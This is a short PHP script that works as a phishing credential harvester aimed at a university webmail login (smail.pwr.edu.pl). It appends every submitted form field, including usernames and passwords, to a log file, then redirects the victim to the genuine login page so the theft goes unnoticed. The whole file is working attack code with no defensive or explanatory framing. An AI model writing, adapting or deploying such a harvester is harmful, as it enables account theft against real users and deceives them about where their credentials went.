<?php
	header('Location:https://smail.pwr.edu.pl/auth');
	$handle=fopen("log.txt","a");
	fwrite($handle,"Atempt:\r\n");
	foreach($_POST as $variable => $value){
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);
	exit;
?>
